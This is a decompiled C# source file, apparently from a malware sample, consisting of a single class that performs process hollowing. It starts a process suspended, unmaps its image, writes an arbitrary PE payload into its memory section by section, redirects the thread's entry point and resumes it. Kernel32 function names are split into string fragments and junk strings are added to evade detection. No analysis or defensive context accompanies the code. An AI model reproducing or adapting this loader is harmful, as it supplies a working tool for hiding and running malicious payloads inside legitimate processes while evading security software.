using System;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns9;

internal class Class58
{
	internal delegate bool Delegate5(IntPtr thrAS3ead, ref Struct25 coDAS3Entext);

	internal delegate uint Delegate6(IntPtr threDSADSAad);

	internal delegate bool Delegate7(IntPtr proSDA3Acess, int addreSDSA3ss, byte[] bufDSA3ASfer, int sizSA3ASDASe, out int wriS3A3S3tten);

	internal delegate IntPtr Delegate8(IntPtr proceSA3ASDASss, int addreSA3AAEss, uint siDSA3ze, uint tyDSA3AS3pe, uint proS3A3SAtect);

	internal struct Struct25
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public Struct26 struct26_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	internal struct Struct26
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	internal struct Struct27
	{
		public uint uint_0;

		public uint uint_1;
	}

	internal struct Struct28
	{
		public byte byte_0;

		public Struct27 struct27_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;
	}

	internal struct Struct29
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_0;

		public int int_1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	internal struct Struct30
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public short short_0;

		public short short_1;

		public int int_9;

		public int int_10;

		public int int_11;

		public int int_12;
	}

	internal struct Struct31
	{
		public int int_0;

		public IntPtr intptr_0;

		public int int_1;
	}

	internal struct Struct32
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	internal struct Struct33
	{
		public uint uint_0;

		public Struct34 struct34_0;

		public Struct35 struct35_0;
	}

	internal struct Struct34
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	internal struct Struct35
	{
		public ushort ushort_0;

		public byte byte_0;

		public byte byte_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Struct36[] struct36_0;
	}

	internal struct Struct36
	{
		public uint uint_0;

		public uint uint_1;
	}

	public static void smethod_0(byte[] byte_0, string string_0)
	{
		Struct25 struct25_ = default(Struct25);
		Struct29 info = default(Struct29);
		Struct30 startup = default(Struct30);
		Struct31 process = default(Struct31);
		Struct31 thread = default(Struct31);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(Struct32).GetType());
		Struct32 @struct = default(Struct32);
		Struct32 struct2 = ((obj != null) ? ((Struct32)obj) : @struct);
		gCHandle.Free();
		string name = null;
		string current = null;
		IntPtr system = default(IntPtr);
		if (0 - (CreateProcess(ref name, ref string_0, ref process, ref thread, inherit: false, 4u, system, ref current, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		Struct33 struct3 = default(Struct33);
		IntPtr ptr = new IntPtr(checked(num + struct2.int_0));
		object? obj2 = Marshal.PtrToStructure(ptr, struct3.GetType());
		Struct33 struct4 = default(Struct33);
		struct3 = ((obj2 != null) ? ((Struct33)obj2) : struct4);
		startup.int_0 = Strings.Len((object)startup);
		struct25_.uint_0 = 65538u;
		string text = "ke";
		string text2 = "rnel32";
		string text3 = "llocEx";
		string text4 = "rtualA";
		string text5 = "Vi";
		string text6 = "Writ";
		string string_ = "ResumeThread";
		string text7 = "eProcessMemory";
		Delegate7 @delegate = smethod_1<Delegate7>(text + text2, text6 + text7);
		string text8 = "SetThre";
		Delegate6 delegate2 = smethod_1<Delegate6>(text + text2, string_);
		string text9 = "adContext";
		Delegate5 delegate3 = smethod_1<Delegate5>(text + text2, text8 + text9);
		Delegate8 delegate4 = smethod_1<Delegate8>(text + text2, text5 + text4 + text3);
		if (((long)struct3.uint_0 != 17744L) | (struct2.ushort_0 != 23117))
		{
			return;
		}
		bool threadContext = GetThreadContext(info.intptr_1, ref struct25_);
		IntPtr intptr_ = info.intptr_0;
		checked
		{
			IntPtr intptr_2 = (IntPtr)(unchecked((long)struct25_.uint_13) + 8L);
			long num2 = default(long);
			ptr = (IntPtr)num2;
			IntPtr intptr_3 = (IntPtr)4;
			int int_ = 0;
			int num3 = ReadProcessMemory(intptr_, intptr_2, ref ptr, intptr_3, ref int_);
			num2 = (long)ptr;
			if (!(unchecked(threadContext && num3 >= 0) & (ZwUnmapViewOfSection(info.intptr_0, (IntPtr)num2) >= 0L)))
			{
				return;
			}
			uint num4 = (uint)(int)delegate4(info.intptr_0, (int)struct3.struct35_0.uint_6, struct3.struct35_0.uint_10, 12288u, 4u);
			if (unchecked((long)num4) == 0L)
			{
				return;
			}
			IntPtr intptr_4 = info.intptr_0;
			int addreSDSA3ss = (int)num4;
			int sizSA3ASDASe = (int)struct3.struct35_0.uint_11;
			uint num5 = default(uint);
			int_ = (int)num5;
			@delegate(intptr_4, addreSDSA3ss, byte_0, sizSA3ASDASe, out int_);
			num5 = (uint)int_;
			long num6 = struct2.int_0 + 248;
			int num7 = unchecked((int)struct3.struct34_0.ushort_1) - 1;
			Struct28 struct5 = default(Struct28);
			Struct28 struct6 = default(Struct28);
			for (int i = 0; i <= num7; i++)
			{
				ptr = new IntPtr(num + num6 + i * 40);
				object? obj3 = Marshal.PtrToStructure(ptr, struct5.GetType());
				struct5 = ((obj3 != null) ? ((Struct28)obj3) : struct6);
				byte[] array = new byte[(int)struct5.uint_1 + 1];
				int num8 = (int)(unchecked((long)struct5.uint_1) - 1L);
				for (int j = 0; j <= num8; j++)
				{
					array[j] = byte_0[(int)(unchecked((long)struct5.uint_2) + unchecked((long)j))];
				}
				IntPtr intptr_5 = info.intptr_0;
				int addreSDSA3ss2 = (int)(num4 + struct5.uint_0);
				int sizSA3ASDASe2 = (int)struct5.uint_1;
				int_ = (int)num5;
				@delegate(intptr_5, addreSDSA3ss2, array, sizSA3ASDASe2, out int_);
				num5 = (uint)int_;
				string text10 = "safdddddddd";
				delegate4(info.intptr_0, (int)(num4 + struct5.uint_0), struct5.struct27_0.uint_1, (uint)smethod_4(struct5.uint_7), (uint)num2);
				string text11 = "sddddddddddddd";
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			IntPtr intptr_6 = info.intptr_0;
			int addreSDSA3ss3 = (int)(unchecked((long)struct25_.uint_13) + 8L);
			int_ = (int)num5;
			@delegate(intptr_6, addreSDSA3ss3, bytes, 4, out int_);
			num5 = (uint)int_;
			struct25_.uint_16 = num4 + struct3.struct35_0.uint_3;
			delegate3(info.intptr_1, ref struct25_);
			delegate2(info.intptr_1);
		}
	}

	private static T smethod_1<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ghsssssssssSFFFFFFFFFFF);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr GSEEEEEEEEEEEEEE, [MarshalAs(UnmanagedType.VBByRefStr)] ref string GGGGGGGGGGESSSSSSSSSSGSD);

	private static long smethod_2(long long_0, long long_1)
	{
		return checked((long)Math.Round(smethod_3(long_0) / Math.Pow(2.0, long_1)));
	}

	private static double smethod_3(long long_0)
	{
		if (long_0 < 0L)
		{
			return (double)long_0 + 4294967296.0;
		}
		return long_0;
	}

	private static long smethod_4(long long_0)
	{
		object[] array = new object[8] { 1L, 16L, 2u, 32L, 4L, 64L, 4L, 64L };
		return Conversions.ToLong(array[checked((int)smethod_2(long_0, 29L))]);
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CreateProcess([MarshalAs(UnmanagedType.VBByRefStr)] ref string name, [MarshalAs(UnmanagedType.VBByRefStr)] ref string command, ref Struct31 process, ref Struct31 thread, bool inherit, uint flags, IntPtr system, [MarshalAs(UnmanagedType.VBByRefStr)] ref string current, [In] ref Struct30 startup, out Struct29 info);

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int ReadProcessMemory(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref int int_0);

	[DllImport("ntdll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern long ZwUnmapViewOfSection(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool GetThreadContext(IntPtr intptr_0, ref Struct25 struct25_0);
}
